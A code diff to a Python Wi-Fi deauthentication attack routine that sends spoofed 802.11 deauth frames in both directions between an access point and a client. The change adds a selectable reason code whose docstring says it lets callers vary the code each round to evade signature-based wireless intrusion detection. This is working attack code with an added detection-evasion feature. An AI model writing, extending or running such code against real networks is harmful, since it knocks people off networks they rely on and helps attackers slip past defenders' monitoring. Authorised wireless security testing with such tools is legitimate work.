@@ -18,6 +18,7 @@ def deauth(
     interval: float = 0.0,
     channel: int | None = None,
     low_rate: bool = False,
+    reason: int = 7,
     progress_fn=None,
 ) -> int:
     """Send count deauth rounds from bssid to client.
@@ -36,6 +37,12 @@ def deauth(
     low_rate: force injection at 6 Mbps instead of the adapter's
     auto/unset rate -- see frames.craft_deauth for why. Opt-in since it
     costs airtime; most adapters don't need it.
+
+    reason: 802.11 reason code, passed straight to frames.craft_deauth
+    (default 7). Exposed so a caller can vary it round-to-round -- see
+    attacks/logic.py's run_deauth_flow -- as one layer against
+    signature-based WIDS detection of a fixed reason code repeated
+    every round.
 
     Returns the raw frame count actually handed to the OS for transmission
     (not the round count -- see above) -- 0 if iface isn't in monitor mode
@@ -86,14 +93,14 @@ def deauth(
         log(f"WARNING: {iface} is in '{mode}' mode, not monitor -- deauth frames cannot transmit")
         return 0
 
-    pkt_fwd = craft_deauth(bssid=bssid, client=client, low_rate=low_rate)
+    pkt_fwd = craft_deauth(bssid=bssid, client=client, reason=reason, low_rate=low_rate)
     # Bidirectional when a real client is targeted (2026-08-30): the vendored
     # aircrack-ng's own aireplay-ng -0/--deauth always sends both AP->client
     # and client->AP for a directed target -- a frame lost in either
     # direction alone can leave the OTHER endpoint still thinking it's
     # associated. Meaningless for BROADCAST (there's no single client MAC to
     # spoof as the reverse frame's source), so that case stays one-directional.
-    pkt_rev = craft_deauth(bssid=bssid, client=client, low_rate=low_rate, from_client=True) if client != BROADCAST else None
+    pkt_rev = craft_deauth(bssid=bssid, client=client, reason=reason, low_rate=low_rate, from_client=True) if client != BROADCAST else None
     try:
         sock = conf.L2socket(iface=iface)
     except OSError as exc:
